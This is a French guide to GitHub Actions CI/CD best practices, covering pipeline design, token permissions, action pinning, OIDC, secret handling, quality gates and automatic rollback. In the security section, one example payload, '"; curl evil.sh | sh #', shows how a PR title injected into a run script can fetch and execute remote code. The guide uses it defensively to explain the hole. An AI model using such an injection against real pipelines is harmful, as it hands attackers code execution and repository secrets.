# Bonnes pratiques CI/CD avec GitHub Actions

Le tagging des images, le scan et le « build once, promote » sont traités dans [Docker, K8s & DevOps](docker-k8s-devops.md). Cette page porte sur le pipeline lui-même.

## ⚙️ Conception du pipeline

### Échouer vite, contrôles les moins chers d'abord

Ordonnez les jobs pour que lint, compilation et tests unitaires passent avant les tests d'intégration lents, les builds d'images et les déploiements. Exécutez les jobs indépendants en parallèle.

**Pourquoi c'est une bonne pratique :** un développeur qui attend 15 minutes pour apprendre qu'il a fait une faute de frappe finit par ne plus faire confiance au pipeline. Les contrôles bon marché donnent un retour en une minute et épargnent du temps de runner. `needs:` exprime l'ordre ; tout ce qui n'a pas de `needs` tourne en parallèle.

```yaml
jobs:
  lint:   { runs-on: ubuntu-latest, steps: [ ... ] }
  unit:   { runs-on: ubuntu-latest, steps: [ ... ] }
  integration:
    needs: [lint, unit]          # ne démarre que si les jobs bon marché passent
    runs-on: ubuntu-latest
    steps: [ ... ]
```

### Mettre les dépendances en cache, et utiliser une matrice seulement quand c'est utile

Utilisez le cache intégré de l'action de setup, et une `matrix` pour les versions réellement supportées.

**Pourquoi c'est une bonne pratique :** télécharger toutes les dépendances Maven ou npm à chaque run coûte des minutes pour rien. Une matrice détecte « marche en 21, casse en 25 » mais multiplie le coût : ne faites pas de matrice sur ce que vous ne livrez pas.

```yaml
unit:
  runs-on: ubuntu-latest
  strategy:
    matrix: { java: [21, 25] }
  steps:
    - uses: actions/setup-java@v4
      with: { distribution: temurin, java-version: "${{ matrix.java }}", cache: maven }
```

### Annuler les runs obsolètes

Utilisez `concurrency` pour qu'un nouveau push annule le run précédent de la même branche, mais n'annulez jamais un déploiement en cours.

**Pourquoi c'est une bonne pratique :** cinq pushes rapprochés sur une PR mettent sinon cinq pipelines complets en file. À l'inverse, annuler un déploiement à moitié fait peut laisser un environnement cassé.

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
```

### Réutiliser les workflows au lieu de copier-coller du YAML

Mettez les étapes communes dans un workflow réutilisable (`workflow_call`) ou une composite action.

**Pourquoi c'est une bonne pratique :** dix services avec dix copies des mêmes 80 lignes, c'est dix PR à chaque correctif (nouveau scanner, nouvelle version de Java), et les copies divergent.

```yaml
# dépôt du service
jobs:
  ci:
    uses: my-org/pipelines/.github/workflows/java-ci.yml@v3
    with: { java-version: "21" }
    secrets: inherit
```

## 🔐 Sécurité du pipeline

### Donner au token le minimum de permissions

Définissez `permissions: contents: read` en haut du workflow, et élevez-les job par job seulement si nécessaire.

**Pourquoi c'est une bonne pratique :** le `GITHUB_TOKEN` par défaut peut souvent écrire dans le dépôt. Une dépendance compromise ou une étape de PR malveillante obtient alors un accès en écriture. Le moindre privilège limite l'impact.

```yaml
permissions: { contents: read }
jobs:
  publish:
    permissions: { contents: read, packages: write }
```

### Épingler les actions tierces sur un SHA de commit

Référencez `uses: owner/action@<sha-complet>` (avec la version en commentaire), et laissez Dependabot ou Renovate le mettre à jour.

**Pourquoi c'est une bonne pratique :** un tag comme `@v4` peut être déplacé par le propriétaire de l'action, ou par un attaquant qui vole son compte, et votre pipeline exécute alors le nouveau code avec vos secrets. Un SHA est immuable.

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

### Utiliser OIDC plutôt que des clés cloud longue durée

Laissez le job demander un token court au fournisseur cloud, plutôt que de stocker une clé d'accès dans les secrets.

**Pourquoi c'est une bonne pratique :** une clé stockée n'expire jamais, est copiée par erreur dans les paramètres des forks et fuit en silence. Un token OIDC vit quelques minutes et la politique de confiance côté cloud peut le restreindre à un dépôt et une branche.

```yaml
permissions: { id-token: write, contents: read }
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with: { role-to-assume: arn:aws:iam::123456789012:role/deploy, aws-region: eu-west-1 }
```

### Ne jamais exécuter de code non fiable avec des secrets

N'utilisez pas `pull_request_target` pour récupérer et exécuter le code d'un fork. N'interpolez jamais `${{ github.event.* }}` directement dans un script `run:`.

**Pourquoi c'est une bonne pratique :** `pull_request_target` s'exécute avec les secrets du dépôt de base ; y exécuter le code de la PR les livre à son auteur. Interpoler un titre de PR dans un script shell est une injection de commande (`"; curl evil.sh | sh #`). Passez-le plutôt par une variable d'environnement.

```yaml
# ⛔ injection
- run: echo "${{ github.event.pull_request.title }}"
# ✅
- run: echo "$TITLE"
  env: { TITLE: "${{ github.event.pull_request.title }}" }
```

## 🚦 Quality gates & livraison

### Appliquer les gates sur la pull request, pas après le merge

Rendez les checks CI obligatoires dans la protection de branche : tests, seuil de couverture sur le code nouveau, analyse statique (SonarQube), scan des dépendances et des images.

**Pourquoi c'est une bonne pratique :** une gate qu'on peut ignorer n'est qu'une suggestion. Mesurer la couverture du code nouveau seulement garde la barre atteignable sur un projet legacy, où un seuil global est soit ignoré, soit bloquant pour tout.

### Protéger la production avec des environments

Utilisez les `environments` GitHub avec relecteurs obligatoires pour la production, et des secrets limités à l'environnement.

**Pourquoi c'est une bonne pratique :** le staging peut se déployer automatiquement au merge, tandis que la production attend un humain, et seuls les jobs ciblant `production` peuvent lire les secrets de production.

```yaml
deploy-prod:
  needs: deploy-staging
  environment: production      # en pause jusqu'à l'approbation d'un relecteur
```

### Faire en sorte que les déploiements reviennent en arrière seuls

Déployez avec un health check et un rollback automatique (`helm upgrade --atomic`, `kubectl rollout status` puis `rollout undo`). Lancez un smoke test après le déploiement.

**Pourquoi c'est une bonne pratique :** un pipeline « vert » après avoir poussé une version cassée est pire qu'aucun pipeline. Attendre la readiness et annuler en cas d'échec transforme une panne en run échoué.

```yaml
- run: |
    kubectl set image deploy/orders orders=$IMAGE
    kubectl rollout status deploy/orders --timeout=120s || { kubectl rollout undo deploy/orders; exit 1; }
```

### Garder le pipeline rapide et observable

Suivez la durée du pipeline et les tests instables, et mettez les tests instables en quarantaine plutôt que de relancer jusqu'au vert.

**Pourquoi c'est une bonne pratique :** un pipeline de 40 minutes qui échoue au hasard est contourné. Le lead time et le taux d'échec des changements (métriques DORA) commencent par un pipeline rapide et fiable.

⛔ « relance-le »
✅ taguer le test instable, le corriger dans le sprint, garder la suite principale déterministe
